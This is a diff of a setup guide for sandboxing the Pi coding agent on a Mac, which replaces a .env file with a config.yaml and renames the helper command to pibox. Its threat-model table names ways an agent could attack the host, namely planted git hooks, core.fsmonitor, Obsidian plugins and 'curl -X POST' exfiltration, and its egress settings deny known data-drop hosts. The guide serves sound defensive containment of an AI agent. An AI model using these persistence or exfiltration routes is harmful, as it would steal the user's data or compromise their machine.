@@ -29,7 +29,7 @@ is the step-by-step setup; pick one option. Part III is reference material.
 | Pi extensions `sandbox-guard.ts`, `web.ts` (§12) | Pi 1.5.0 through the pi-text bridge | Path guard allows the projects and the vault, blocks `/etc/...`; `write`/`edit` of `.git/hooks` and `.obsidian` refused; risky bash and unapproved web access are refused without a UI; `web_fetch` and `web_search` return real content |
 | Egress policy `egress_policy.py` (§9.6) | mitmproxy 12.3.1 | GET/HEAD pass; POST/PUT, bodies, HTTP/1.1 upgrades, private and metadata IPs, other ports, denied hosts and raw TCP are refused; encrypted tunnels (CONNECT) are refused; allowed requests wait for approval except `EGRESS_NO_APPROVAL` hosts; an `EGRESS_ALLOW_PRIVATE` host passes; allowed plain-HTTP requests are forwarded to an upstream HTTP proxy (`--mode upstream`), `UPSTREAM_NO_PROXY` hosts directly (the upstream proxy sees none of their requests); large downloads stream through; the journal records every decision |
 | Compose stack of Option C (§9) | Docker Engine 29 + Compose 5 on Linux | Images build with empty proxy build args and with Debian mirror URLs substituted; no certificates anywhere; the internal network has no route out; only the bridge and the proxy are reachable; projects and vault writable at host paths, `.obsidian` read-only; config and root FS read-only; Pi runs tools end to end; files land with the host UID; the §9.12 check passes |
-| `.env` and the `pi-sandbox` command (§6.3, §6.4) | zsh 5.9 + Docker CLI on Linux, against the real Compose stack | One `.env` drives everything: non-default ports and limits reach the containers; the model list is generated (several ids); `config`, `up`, `run`, `verify`, `log`, `review` work end to end; agents start only under the projects or the vault; `jail` and `webproxy` pass a clean environment (an exported token and the router key don't get through); `bridge` serves on `BRIDGE_PORT`; `vm` writes the Colima config. `colima`, `sandbox-exec` and `container` were stand-ins that print their arguments |
+| `config.yaml` and the `pibox` command (§6.3, §6.4) | zsh 5.9 + yq 4.53 + Docker 29 / Compose 5 on Linux | Every section of `config.yaml` is read (lists, booleans, maps as JSON for the bridge); unknown keys, model entries without `contextWindow`/`maxTokens`, bad `agent_docker.mode` and YAML syntax errors stop with a message; several models with their own `contextWindow`, `maxTokens`, `reasoning` and `compat` end up in `models.json`; the generated `.env` drives plain `docker compose` (`config`, `up` of bridge and proxy: non-default bridge port, memory limit, `agent_docker.mode: off`, egress settings reach the containers); the bridge container gets only the `bridge` section; `pibox bridge` passes the bridge settings, `jail` and `webproxy` a clean environment; `vm` writes the Colima config with the upstream proxy. `colima`, `sandbox-exec`, `mitmproxy` and `uvicorn` were stand-ins that print their arguments. The agent's image (`pibox up`, `run`, `verify`) was **not rebuilt** for this version of the command |
 | Development toolchain in Option C (§9.4, §9.9, §9.10) | Docker Engine 29 on Linux; nginx in front of Maven Central, npm, PyPI and the Gradle plugin portal over plain HTTP, `registry:2` as Docker Hub mirror, a separate upstream proxy | JDK 17/21/25 (`jdk`), Maven 3.10 (`mvn test` on 17 and 25), Gradle 9.8 with a JDK 17 toolchain and `mavenCentral()` redirected by `init.gradle`, npm, pip in a venv, all through the generated settings (credentials with special characters included) and the proxy, the repository reached directly via `UPSTREAM_NO_PROXY`. The agent's engine (`AGENT_DOCKER=privileged`): pulls through the mirror and from the HTTP registry, `docker compose up` + request to `docker:8088`, `docker build` with network in `RUN`, nested containers only GET through the proxy and no direct route, a Testcontainers Redis test passes. `sysbox` mode **not run here** |
 | Seatbelt (§7), Colima specifics (§8, §9.2), Homebrew, Apple `container` (§10) | **not run here** (no Mac in the test environment) | Written from the tools' documentation. Run the verification step of each section |
 
@@ -150,7 +150,7 @@ What we protect, and which defence stops what:
 | Credentials | `~/.ssh`, `~/.aws`, `~/.config/gh`, `~/.pi/agent/auth.json`, Keychain | File isolation (Seatbelt or VM); the bridge keeps the model key away |
 | Personal data | `~/Documents`, Mail, Photos | File isolation; TCC |
 | Everything outside your folders | `~/Library`, `~/Downloads`, other people's files | Only the projects and the vault are allowed or mounted |
-| Code that runs later on the Mac | a planted `.git/hooks/post-checkout`, `core.fsmonitor` in `.git/config`, an Obsidian plugin | Those paths read-only where possible; `pi-sandbox review` after each session (§6.1, §6.7) |
+| Code that runs later on the Mac | a planted `.git/hooks/post-checkout`, `core.fsmonitor` in `.git/config`, an Obsidian plugin | Those paths read-only where possible; `pibox review` after each session (§6.1, §6.7) |
 | The Mac itself | LaunchAgents, `~/.zshrc`, AppleScript control of apps | Write restrictions; Apple Events denied; VM |
 | Exfiltration | `curl -X POST` with your data | No direct network; GET-only proxy; approval of every request |
 | Your LAN | router admin page, NAS, cloud metadata | Proxy refuses private addresses; no direct network |
@@ -243,7 +243,7 @@ An HTTP proxy is a server that makes web requests on behalf of clients. Tools fi
 
 So the sandbox works with plain requests only. The agent's tools talk to our filtering proxy over
 plain HTTP, the proxy allows `GET`/`HEAD` and refuses every tunnel, and passes allowed requests on to
-the next proxy (`UPSTREAM_PROXY`), which takes care of the connection to the site. Nothing is decrypted
+the next proxy (`network.upstream_proxy`), which takes care of the connection to the site. Nothing is decrypted
 and no certificates are involved. In practice that means: inside the sandbox use `http://` URLs, and
 `http://` addresses for package mirrors; the `web_fetch` tool converts URLs for you.
 
@@ -283,7 +283,7 @@ layers above.
 | Rest of `$HOME` hidden | yes (denied) | yes | yes | yes | no, for Pi itself |
 | Network outside your control | blocked (localhost only) | open | **impossible** | open | open |
 | GET-only + approval | with host proxy (§13) | not enforced | **enforced** | not enforced | no |
-| Model key reachable by agent | no | no | no (yes with `AGENT_DOCKER=privileged`) | no | via env vars |
+| Model key reachable by agent | no | no | no (yes with `agent_docker.mode: privileged`) | no | via env vars |
 | Build tools | the Mac's own | install yourself | **JDK 17/21/25, Maven, Gradle, Node, Python** | as in C, without Docker | the Mac's own |
 | Docker for the agent | no | the VM's own (no limits) | **its own engine, same network limits** | no | no |
 | Effort | low | medium | medium–high | medium | medium |
@@ -303,9 +303,9 @@ layers above.
 ## 6. Common preparation (all options)
 
 Everything the sandbox needs lives in one folder, `~/.pi-sandbox`, and is configured in **one file**,
-`~/.pi-sandbox/.env`. Every other file in this guide is copied once, exactly as printed, and never
-edited: folders, hosts, ports, the model, package sources, VM size and container limits all come
-from `.env`. One command, `pi-sandbox`, reads it and runs every option.
+`~/.pi-sandbox/config.yaml`. Every other file in this guide is copied once, exactly as printed, and
+never edited: folders, hosts, ports, the models, package sources, VM size and container limits all
+come from `config.yaml`. One command, `pibox`, reads it and runs every option.
 
 ### 6.1 The folders the agent works in
 
@@ -337,7 +337,7 @@ Nothing else in your home folder exists for it.
   - `<vault>/.obsidian/`: settings and **community plugins**, JavaScript that Obsidian executes.
 
   Every option makes these read-only or blocked where it can (Seatbelt rules, a read-only mount,
-  the Pi extension), and `pi-sandbox review` (§6.7) shows any change to them after a session.
+  the Pi extension), and `pibox review` (§6.7) shows any change to them after a session.
 
 ### 6.2 Check your terminal's privacy grants
 
@@ -346,14 +346,15 @@ you'll use for Pi is **not** listed. Also look at *Automation* and *Accessibilit
 **Why:** the agent inherits these grants (§4.2). For Option A especially, consider a separate
 terminal app (Ghostty, WezTerm, iTerm2) used only for the agent and granted nothing.
 
-### 6.3 The sandbox folder and `.env`
+### 6.3 The sandbox folder and `config.yaml`
 
 **What:** one folder holds everything that belongs to the sandbox and must stay out of the agent's reach:
 
 ```
 ~/.pi-sandbox/
-├── .env                  # ALL settings, the only file you edit (this section)
-├── pi-sandbox            # the command that runs everything (§6.4)
+├── config.yaml           # ALL settings, the only file you edit (this section)
+├── pibox                 # the command that runs everything (§6.4)
+├── .env, generated/      # generated from config.yaml by pibox: never edit
 ├── pi-text/              # a clone of this repository: the bridge
 ├── agent/settings.json   # Pi's settings for the sandbox (§6.6); models*.json are generated next to it
 ├── extensions/           # sandbox-guard.ts, web.ts (§12)
@@ -370,229 +371,344 @@ git clone <URL-OF-THIS-REPOSITORY> ~/.pi-sandbox/pi-text
 ```
 
 Then create the files of the options you use from the blocks in this guide (copy them unchanged).
-`.env` is the one you fill in. Protect it, because it holds the router key:
+`config.yaml` is the one you fill in. Protect it, because it holds the router key:
 
 ```bash
-touch ~/.pi-sandbox/.env && chmod 600 ~/.pi-sandbox/.env
+touch ~/.pi-sandbox/config.yaml && chmod 600 ~/.pi-sandbox/config.yaml
+brew install yq                   # pibox reads config.yaml with it
 ```
 
-`~/.pi-sandbox/.env`:
+`~/.pi-sandbox/config.yaml`:
 
-```bash
-# ~/.pi-sandbox/.env: the only file you edit. Read by the pi-sandbox command and by docker compose.
-# KEY=value per line; quote values with spaces or $ in single quotes. A commented-out line keeps
-# the default shown. After a change: `pi-sandbox up` (Option C) or restart the command you use.
+```yaml
+# ~/.pi-sandbox/config.yaml: the only file you edit. pibox reads it on every run and generates
+# everything else from it: .env for docker compose, the bridge's environment, Pi's model list, the
+# package managers' settings, the Colima config. A commented-out line shows the default.
 
 # ---- Folders the agent may use (absolute paths on the Mac) ----
-PROJECTS_DIR=/Users/you/Projects
-VAULT_DIR="/Users/you/Notes/Main Vault"
+folders:
+  projects: /Users/you/Projects
+  vault: /Users/you/Notes/Main Vault
 
-# ---- Model router, used only by the bridge ----
-PI_TEXT_URL=https://router.example.com/v1
-PI_TEXT_KEY='YOUR_KEY'
-TRACE=-
-# Any other bridge setting from the README goes here too, e.g. for OpenRouter:
-# UPSTREAM_EXTRA_BODY='{"provider": {"only": ["wafer/fp8"], "allow_fallbacks": false}}'
+# ---- The bridge's environment, passed as is: any setting from the README's configuration table ----
+bridge:
+  PI_TEXT_URL: https://router.example.com/v1
+  PI_TEXT_KEY: YOUR_KEY
+  TRACE: "-"
+  # A map or a list is passed as JSON, e.g. for OpenRouter:
+  # UPSTREAM_EXTRA_BODY: { provider: { only: [wafer/fp8], allow_fallbacks: false } }
 
-# ---- The model as Pi sees it (several ids: comma-separated, no spaces; they share the settings below) ----
-MODEL_ID=YOUR_MODEL_ID
-# MODEL_REASONING=false
-# MODEL_REASONING_EFFORT=false
-# MODEL_CONTEXT=32768
-# MODEL_MAX_TOKENS=8192
+# ---- The models Pi offers, each with its own settings ----
+# Entries of Pi's models.json (README, "Configuring Pi"). Required: id, contextWindow, maxTokens.
+# Defaults: name "<id> (sandbox)", reasoning: false, input: [text], cost 0. compat changes the
+# provider's compat for this model only.
+models:
+  - id: YOUR_MODEL_ID
+    contextWindow: 32768      # the model's context window: Pi compacts the conversation before it fills up
+    maxTokens: 8192           # output limit of one reply: big write/edit calls need room
+  # - id: YOUR_REASONING_MODEL_ID
+  #   reasoning: true
+  #   contextWindow: 131072
+  #   maxTokens: 32768
+  #   compat: { supportsReasoningEffort: true }
 
-# ---- Ports on the Mac (Options A, B, D) and inside the Compose networks (C) ----
-# BRIDGE_PORT=8789
-# PROXY_PORT=8080
-
-# ---- Outgoing HTTP proxy, as seen from inside the VM; empty = connect directly ----
-# A proxy listening on the Mac's own 127.0.0.1:PORT is http://192.168.5.2:PORT from the VM;
-# commands that run on the Mac turn 192.168.5.2 back into 127.0.0.1 themselves.
-UPSTREAM_PROXY=
-# Hosts the bridge and image builds reach directly, not through UPSTREAM_PROXY
-UPSTREAM_NO_PROXY=
+# ---- Network ----
+network:
+  # Ports of the bridge and the filtering proxy: on the Mac (Options A, B, D), inside Compose (C)
+  # bridge_port: 8789
+  # proxy_port: 8080
+  # Address they listen on, on the Mac; Option D: the container network's gateway (§10)
+  # listen_host: 127.0.0.1
+  # Outgoing HTTP proxy, as seen from inside the VM; empty = connect directly.
+  # A proxy listening on the Mac's own 127.0.0.1:PORT is http://192.168.5.2:PORT from the VM;
+  # commands that run on the Mac turn 192.168.5.2 back into 127.0.0.1 themselves.
+  upstream_proxy: ""
+  # Hosts the bridge and image builds reach directly, not through upstream_proxy
+  upstream_no_proxy: []
+  # Internal network of Option C: change it if it overlaps with networks you need to reach
+  # sandbox_subnet: 172.30.0.0/24
 
 # ---- The agent's web policy (§9.6) ----
-# Hosts on private IPs the agent may still GET from: your package mirror
-EGRESS_ALLOW_PRIVATE=repo.example.com
-# Hosts that don't wait for your approval: the package mirror
-EGRESS_NO_APPROVAL=repo.example.com
-# If set, ONLY these hosts are reachable
-EGRESS_ALLOW_ONLY=
-# Always refused
-EGRESS_DENY=pastebin.com,transfer.sh,0x0.st
-# Allowed ports; add your repository's ports if they are not 80/443, e.g. 80,443,8082
-# EGRESS_PORTS=80,443
+egress:
+  # Hosts on private IPs the agent may still GET from: your package mirror
+  allow_private: [repo.example.com]
+  # Hosts that don't wait for your approval: the package mirror
+  no_approval: [repo.example.com]
+  # If not empty, ONLY these hosts are reachable
+  allow_only: []
+  # Always refused
+  deny: [pastebin.com, transfer.sh, 0x0.st]
+  # Allowed ports; add your repository's ports if they are not 80/443
+  # ports: [80, 443]
 
 # ---- Pi extensions (§12) ----
-# PI_BASH_APPROVAL=risky
-# PI_WEB_PLAIN_HTTP=1
-# WEB_SEARCH_SEARXNG=
-# WEB_FETCH_MAX_CHARS=20000
+extensions:
+  # bash_approval: risky
+  # web_plain_http: true
+  # searxng: ""
+  # fetch_max_chars: 20000
 
 # ---- Your artifact repository (Artifactory, Nexus, ...) ----
 # The agent downloads everything through the filtering proxy as plain HTTP, so use http:// URLs.
-# pi-sandbox writes Maven's settings.xml, Gradle's init script, .npmrc, pip.conf and Docker's
+# pibox writes Maven's settings.xml, Gradle's init script, .npmrc, pip.conf and Docker's
 # config from these values (§9.9). The agent can read them: use a READ-ONLY token.
-ARTIFACTORY_USER=
-ARTIFACTORY_TOKEN=
-# Maven repository (a virtual repo that proxies Maven Central etc.); Gradle uses it too
-MAVEN_REPO_URL=http://repo.example.com/artifactory/maven-remote
-# Gradle plugins (a remote repo of https://plugins.gradle.org/m2); empty = MAVEN_REPO_URL
-GRADLE_PLUGIN_REPO_URL=
-# npm registry, Python package index (+ its host name for pip), mirror of https://nodejs.org/dist
-NPM_REGISTRY=http://repo.example.com/artifactory/api/npm/npm-remote/
-PIP_INDEX_URL=http://repo.example.com/artifactory/api/pypi/pypi-remote/simple
-PIP_TRUSTED_HOST=repo.example.com
-NODE_DIST=http://repo.example.com/artifactory/nodejs-dist
-# Docker registry for the agent's own Docker (host[:port], plain HTTP), the mirror used for
-# Docker Hub names (postgres:16), and the prefix Testcontainers puts before Docker Hub names
-DOCKER_REGISTRY=repo.example.com:8082
-DOCKER_REGISTRY_MIRROR=http://repo.example.com:8082
-DOCKER_IMAGE_PREFIX=repo.example.com:8082/
-# Debian (containers) and Ubuntu (Option B VM) package mirrors, http:// addresses; empty = the official servers
-APT_DEBIAN=
-APT_SECURITY=
-APT_UBUNTU=
+repository:
+  user: ""
+  token: ""
+  # Maven repository (a virtual repo that proxies Maven Central etc.); Gradle uses it too
+  maven: http://repo.example.com/artifactory/maven-remote
+  # Gradle plugins (a remote repo of https://plugins.gradle.org/m2); empty = maven
+  gradle_plugins: ""
+  # npm registry, Python package index (+ its host name for pip), mirror of https://nodejs.org/dist
+  npm: http://repo.example.com/artifactory/api/npm/npm-remote/
+  pip: http://repo.example.com/artifactory/api/pypi/pypi-remote/simple
+  pip_trusted_host: repo.example.com
+  node_dist: http://repo.example.com/artifactory/nodejs-dist
+  # Docker registry for the agent's own Docker (host[:port], plain HTTP), the mirror used for
+  # Docker Hub names (postgres:16), and the prefix Testcontainers puts before Docker Hub names
+  docker_registry: repo.example.com:8082
+  docker_mirror: http://repo.example.com:8082
+  docker_image_prefix: repo.example.com:8082/
+  # Debian (containers) and Ubuntu (Option B VM) package mirrors, http:// addresses; empty = the official servers
+  apt_debian: ""
+  apt_security: ""
+  apt_ubuntu: ""
 
 # ---- Images the sandbox is built from ----
 # Docker Hub names, or the same images through your registry mirror,
 # e.g. repo.example.com:8082/library/node:24-bookworm-slim. They are pulled by the VM's Docker.
-# NODE_IMAGE=node:24-bookworm-slim
-# PYTHON_IMAGE=python:3.12-slim
-# MITMPROXY_IMAGE=mitmproxy/mitmproxy:12.3.1
-# JDK17_IMAGE=eclipse-temurin:17-jdk
-# JDK21_IMAGE=eclipse-temurin:21-jdk
-# JDK25_IMAGE=eclipse-temurin:25-jdk
-# JAVA_DEFAULT=21
-# MAVEN_IMAGE=maven:3-eclipse-temurin-21
-# GRADLE_IMAGE=gradle:jdk21
-# DOCKER_CLI_IMAGE=docker:29-cli
-# DIND_IMAGE=docker:29-dind
-# Pi version (npm spec) and the system packages baked into the agent's image
-# PI_PACKAGE=@earendil-works/pi-coding-agent
-# PI_APT_PACKAGES="bash ca-certificates curl git ripgrep jq httpie unzip zip less procps build-essential python3 python3-dev python3-venv python3-pip"
-# Where Node.js lives on the Mac (Options A, E): pi-sandbox install-node puts it here
-# NODE_HOME=/Users/you/.local/node
+images:
+  # node: node:24-bookworm-slim
+  # python: python:3.12-slim
+  # mitmproxy: mitmproxy/mitmproxy:12.3.1
+  # jdk17: eclipse-temurin:17-jdk
+  # jdk21: eclipse-temurin:21-jdk
+  # jdk25: eclipse-temurin:25-jdk
+  # maven: maven:3-eclipse-temurin-21
+  # gradle: gradle:jdk21
+  # docker_cli: docker:29-cli
+  # dind: docker:29-dind
+
+# ---- The agent's image and container (Option C) ----
+pi:
+  # Pi version (npm spec), the system packages baked into the image, the default JDK
+  # package: "@earendil-works/pi-coding-agent"
+  # apt_packages: [bash, ca-certificates, curl, git, ripgrep, jq, httpie, unzip, zip, less, procps,
+  #                build-essential, python3, python3-dev, python3-venv, python3-pip]
+  # java_default: 21
+  # Limits of the agent's container
+  # memory: 8g
+  # cpus: 4
+  # pids: 4096
 
 # ---- The agent's own Docker engine (Option C, §9.10) ----
-# sysbox: nested containers without a privileged container (needs `pi-sandbox vm-sysbox`)
-# privileged: works everywhere, but the agent can then become root in the VM (§9.10)
-# off: no Docker for the agent
-AGENT_DOCKER=sysbox
-# SYSBOX_DEB_URL=http://repo.example.com/artifactory/github/nestybox/sysbox/releases/download/v0.6.7/sysbox-ce_0.6.7-0.linux_arm64.deb
-# Internal network of the sandbox and the address pool of the agent's Docker: change them if
-# they overlap with networks you need to reach
-# SANDBOX_SUBNET=172.30.0.0/24
-# DIND_ADDRESS_POOL=172.31.0.0/16
-# DIND_MIN_API_VERSION=1.24
+agent_docker:
+  # sysbox: nested containers without a privileged container (needs `pibox vm-sysbox`)
+  # privileged: works everywhere, but the agent can then become root in the VM (§9.10)
+  # off: no Docker for the agent
+  mode: sysbox
+  # sysbox_deb_url: http://repo.example.com/artifactory/github/nestybox/sysbox/releases/download/v0.6.7/sysbox-ce_0.6.7-0.linux_arm64.deb
+  # Address pool of the agent's Docker: change it if it overlaps with networks you need to reach
+  # address_pool: 172.31.0.0/16
+  # min_api_version: "1.24"
 
 # ---- Colima VM (Options B, C) ----
-# VM_PROFILE=pi
-# VM_CPUS=6
-# VM_MEMORY=12
-# VM_DISK=100
-# VM_DISK_IMAGE=
-# ---- Limits of the agent's container (Option C) ----
-# PI_MEMORY=8g
-# PI_CPUS=4
-# PI_PIDS=4096
-# Your Mac user and group ids; detected automatically
-# HOST_UID=501
-# HOST_GID=20
+vm:
+  # profile: pi
+  # cpus: 6
+  # memory: 12
+  # disk: 100
+  # disk_image: ""
+
+# ---- The Mac ----
+mac:
+  # Where Node.js lives (Options A, E): pibox install-node puts it here
+  # node_home: /Users/you/.local/node
+  # Your user and group ids; detected automatically
+  # uid: 501
+  # gid: 20
 ```
 
 How to read it:
 
-- `KEY=value`, one per line. **Commented-out lines show the defaults**: uncomment a line only to
-  change it. Quote values with spaces (`"…"`) and values with `$` or JSON in single quotes (`'…'`).
-- Both `docker compose` and the `pi-sandbox` command read this file, so there is exactly one place
-  for every value.
-- After a change, restart what uses it: `pi-sandbox up` for Option C, or the `pi-sandbox` command you
-  run for the other options. `pi-sandbox config` prints the values in effect (the key masked).
+- **Commented-out lines show the defaults**: uncomment a line only to change it. Lists are YAML
+  lists (`[a, b]` or one `- item` per line). Quote values YAML would read as something else:
+  `"-"`, `"1.24"`, values starting with `@`, `*`, `&` or `{`.
+- `pibox` stops with an error on a setting it doesn't know, so a typo doesn't silently fall back to a
+  default.
+- **Generated, never edited:** `~/.pi-sandbox/.env` (every setting in effect, for `docker compose`),
+  `generated/bridge.env` (the bridge's environment, Option C) and `agent/models*.json` (Pi's model
+  list). `pibox` rewrites them on every run, so plain `docker compose` commands in `~/.pi-sandbox`
+  see the same values as `pibox`.
+- After a change, restart what uses it: `pibox up` for Option C, or the `pibox` command you
+  run for the other options. `pibox config` prints the values in effect (secrets masked).
 
-What the groups mean:
+What the sections mean:
 
-| Settings | Used by | Notes |
+| Section | Used by | Notes |
 |---|---|---|
-| `PROJECTS_DIR`, `VAULT_DIR` | every option | Absolute paths, no `~`. They are mounted into VMs and containers **at the same path**, so a path the agent prints is the path you open on the Mac |
-| `PI_TEXT_URL`, `PI_TEXT_KEY`, `TRACE` and other bridge settings | the bridge only | Any setting from the README's configuration table. In Option C only the bridge container gets this file; in the other options only `pi-sandbox bridge` passes it on |
-| `MODEL_*` | every option | The model list Pi shows. `pi-sandbox` writes Pi's `models.json` from it, with the right bridge address for each option |
-| `BRIDGE_PORT`, `PROXY_PORT` | every option | The bridge and the filtering proxy: on the Mac's `127.0.0.1` (A, B, D) or inside the Compose networks (C) |
-| `UPSTREAM_PROXY`, `UPSTREAM_NO_PROXY` | every option | The HTTP proxy that allowed requests go to after the sandbox's own filter, written as the VM sees it. Empty: connect directly. `UPSTREAM_NO_PROXY` lists hosts the bridge and image builds reach without it |
-| `EGRESS_*` | A, C, D | The agent's web policy, explained in §9.6 |
-| `PI_BASH_APPROVAL`, `PI_WEB_PLAIN_HTTP`, `WEB_*` | every option | Settings of the Pi extensions (§12) |
-| `ARTIFACTORY_*`, `MAVEN_REPO_URL`, `GRADLE_PLUGIN_REPO_URL`, `NPM_REGISTRY`, `PIP_*`, `NODE_DIST`, `DOCKER_REGISTRY*`, `DOCKER_IMAGE_PREFIX`, `APT_*` | install steps, image builds, and every download of the agent | Your artifact repository. `pi-sandbox` writes Maven's, Gradle's, npm's, pip's and Docker's settings from these values (§9.9). The agent's downloads leave the sandbox as plain HTTP requests (§4.6), so these are `http://` addresses |
-| `*_IMAGE`, `JAVA_DEFAULT`, `PI_PACKAGE`, `PI_APT_PACKAGES` | image builds (C) | The images the sandbox is built from (JDK 17/21/25, Maven, Gradle, Docker CLI, Docker engine), the default JDK, the Pi version, the system tools in the agent's image |
-| `AGENT_DOCKER`, `SYSBOX_DEB_URL`, `SANDBOX_SUBNET`, `DIND_*` | C | The agent's own Docker engine and its isolation (§9.10), and the internal address ranges |
-| `NODE_HOME` | A, E | Where Node.js lives on the Mac |
-| `VM_*` | B, C | Name and size of the Colima VM |
-| `PI_MEMORY`, `PI_CPUS`, `PI_PIDS` | C | Limits of the agent's container |
+| `folders` | every option | Absolute paths, no `~`. They are mounted into VMs and containers **at the same path**, so a path the agent prints is the path you open on the Mac |
+| `bridge` | the bridge only | Any setting from the README's configuration table, under its own name. In Option C only the bridge container gets them (`generated/bridge.env`); in the other options only `pibox bridge` passes them on |
+| `models` | every option | The model list Pi shows, each model with its own context window, output limit, reasoning and compat. `pibox` writes Pi's `models.json` from it, with the right bridge address for each option |
+| `network` | every option | `bridge_port`, `proxy_port`: the bridge and the filtering proxy, on the Mac's `127.0.0.1` (A, B, D) or inside the Compose networks (C). `upstream_proxy`: the HTTP proxy that allowed requests go to after the sandbox's own filter, written as the VM sees it; empty: connect directly. `upstream_no_proxy` lists hosts the bridge and image builds reach without it |
+| `egress` | A, C, D | The agent's web policy, explained in §9.6 |
+| `extensions` | every option | Settings of the Pi extensions (§12) |
+| `repository` | install steps, image builds, and every download of the agent | Your artifact repository. `pibox` writes Maven's, Gradle's, npm's, pip's and Docker's settings from these values (§9.9). The agent's downloads leave the sandbox as plain HTTP requests (§4.6), so these are `http://` addresses |
+| `images`, `pi` | image builds and the agent's container (C) | The images the sandbox is built from (JDK 17/21/25, Maven, Gradle, Docker CLI, Docker engine), the Pi version, the system tools in the agent's image, the default JDK, the container's limits |
+| `agent_docker`, `network.sandbox_subnet` | C | The agent's own Docker engine and its isolation (§9.10), and the internal address ranges |
+| `vm` | B, C | Name and size of the Colima VM |
+| `mac` | A, E; all | Where Node.js lives on the Mac; your user and group ids |
 
 If Homebrew on your Mac downloads through a mirror, it is configured with Homebrew's own variables in
 `~/.zprofile` (`HOMEBREW_API_DOMAIN`, `HOMEBREW_BOTTLE_DOMAIN` or `HOMEBREW_ARTIFACT_DOMAIN`; see
 `man brew`, section ENVIRONMENT). Every `brew install` below assumes Homebrew already works for you.
 
-### 6.4 The `pi-sandbox` command
+### 6.4 The `pibox` command
 
-**What:** one zsh script runs every step of every option. Save it as `~/.pi-sandbox/pi-sandbox`, make
+**What:** one zsh script runs every step of every option. Save it as `~/.pi-sandbox/pibox`, make
 it executable and put it on your `PATH`:
 
 ```bash
-chmod +x ~/.pi-sandbox/pi-sandbox
-ln -s ~/.pi-sandbox/pi-sandbox ~/.local/bin/pi-sandbox     # ~/.local/bin must be on PATH
-pi-sandbox config
+chmod +x ~/.pi-sandbox/pibox
+ln -s ~/.pi-sandbox/pibox ~/.local/bin/pibox     # ~/.local/bin must be on PATH
+pibox config
 ```
 
 ```zsh
 #!/bin/zsh
-# pi-sandbox: one command for every option of pi-setup.md. All settings live in ~/.pi-sandbox/.env.
-#   pi-sandbox help      lists the commands
+# pibox: one command for every option of pi-setup.md. All settings live in ~/.pi-sandbox/config.yaml.
+#   pibox help      lists the commands
 setopt err_exit no_unset pipe_fail
 
 SB="${PI_SANDBOX_DIR:-$HOME/.pi-sandbox}"; SB="${SB:A}"
-ENV_FILE="$SB/.env"
-die() { print -u2 "pi-sandbox: $*"; exit 1 }
-[[ -r "$ENV_FILE" ]] || die "$ENV_FILE not found (see pi-setup.md §6.3)"
+CONFIG="$SB/config.yaml"
+die() { print -u2 "pibox: $*"; exit 1 }
+[[ -r "$CONFIG" ]] || die "$CONFIG not found (see pi-setup.md §6.3)"
+(( $+commands[yq] )) || die "yq not found: brew install yq"
 
 # ---------------------------------------------------------------- settings
-# Defaults first; every one of them can be set in .env. set -a exports them, so docker compose
-# sees the same values. Programs started for the agent get a clean environment (env -i) instead.
+# Every key of config.yaml (except bridge and models) and the variable that this script,
+# compose.yaml and the extensions use for it.
+typeset -A SETTING=(
+  folders.projects PROJECTS_DIR                  folders.vault VAULT_DIR
+  network.bridge_port BRIDGE_PORT                network.proxy_port PROXY_PORT
+  network.listen_host LISTEN_HOST                network.sandbox_subnet SANDBOX_SUBNET
+  network.upstream_proxy UPSTREAM_PROXY          network.upstream_no_proxy UPSTREAM_NO_PROXY
+  egress.allow_private EGRESS_ALLOW_PRIVATE      egress.no_approval EGRESS_NO_APPROVAL
+  egress.allow_only EGRESS_ALLOW_ONLY            egress.deny EGRESS_DENY
+  egress.ports EGRESS_PORTS
+  extensions.bash_approval PI_BASH_APPROVAL      extensions.web_plain_http PI_WEB_PLAIN_HTTP
+  extensions.searxng WEB_SEARCH_SEARXNG          extensions.fetch_max_chars WEB_FETCH_MAX_CHARS
+  repository.user ARTIFACTORY_USER               repository.token ARTIFACTORY_TOKEN
+  repository.maven MAVEN_REPO_URL                repository.gradle_plugins GRADLE_PLUGIN_REPO_URL
+  repository.npm NPM_REGISTRY                    repository.node_dist NODE_DIST
+  repository.pip PIP_INDEX_URL                   repository.pip_trusted_host PIP_TRUSTED_HOST
+  repository.docker_registry DOCKER_REGISTRY     repository.docker_mirror DOCKER_REGISTRY_MIRROR
+  repository.docker_image_prefix DOCKER_IMAGE_PREFIX
+  repository.apt_debian APT_DEBIAN               repository.apt_security APT_SECURITY
+  repository.apt_ubuntu APT_UBUNTU
+  images.node NODE_IMAGE                         images.python PYTHON_IMAGE
+  images.mitmproxy MITMPROXY_IMAGE               images.jdk17 JDK17_IMAGE
+  images.jdk21 JDK21_IMAGE                       images.jdk25 JDK25_IMAGE
+  images.maven MAVEN_IMAGE                       images.gradle GRADLE_IMAGE
+  images.docker_cli DOCKER_CLI_IMAGE             images.dind DIND_IMAGE
+  pi.package PI_PACKAGE                          pi.apt_packages PI_APT_PACKAGES
+  pi.java_default JAVA_DEFAULT                   pi.memory PI_MEMORY
+  pi.cpus PI_CPUS                                pi.pids PI_PIDS
+  agent_docker.mode AGENT_DOCKER                 agent_docker.sysbox_deb_url SYSBOX_DEB_URL
+  agent_docker.address_pool DIND_ADDRESS_POOL    agent_docker.min_api_version DIND_MIN_API_VERSION
+  vm.profile VM_PROFILE                          vm.cpus VM_CPUS
+  vm.memory VM_MEMORY                            vm.disk VM_DISK
+  vm.disk_image VM_DISK_IMAGE
+  mac.node_home NODE_HOME                        mac.uid HOST_UID
+  mac.gid HOST_GID
+)
+# yq programs: the settings as key=value lines (lists joined with commas), the bridge's environment
+# as NAME=value lines (maps and lists as JSON); every value shell-quoted.
+YQ_SETTINGS='del(.bridge, .models) | (.. | select(tag == "!!seq")) |= (map(tostring) | join(","))
+  | (.. | select(tag == "!!null")) |= "" | .. | select(tag != "!!map" and (parent | tag) == "!!map")
+  | (path | join(".")) + "=" + (tostring | @sh)'
+YQ_BRIDGE='.bridge // {} | (.[] | select(tag == "!!map" or tag == "!!seq")) |= to_json(0)
+  | (.[] | select(tag == "!!null")) |= "" | to_entries | .[] | .key + "=" + (.value | tostring | @sh)'
+
+# Defaults first; config.yaml overrides them. set -a exports them, so docker compose sees the same
+# values. Programs started for the agent get a clean environment (env -i) instead.
 set -a
-BRIDGE_PORT=8789 PROXY_PORT=8080 LISTEN_HOST=127.0.0.1
-MODEL_ID="" MODEL_REASONING=false MODEL_REASONING_EFFORT=false MODEL_CONTEXT=32768 MODEL_MAX_TOKENS=8192
-NODE_IMAGE=node:24-bookworm-slim PYTHON_IMAGE=python:3.12-slim MITMPROXY_IMAGE=mitmproxy/mitmproxy:12.3.1
-APT_DEBIAN="" APT_SECURITY="" APT_UBUNTU=""
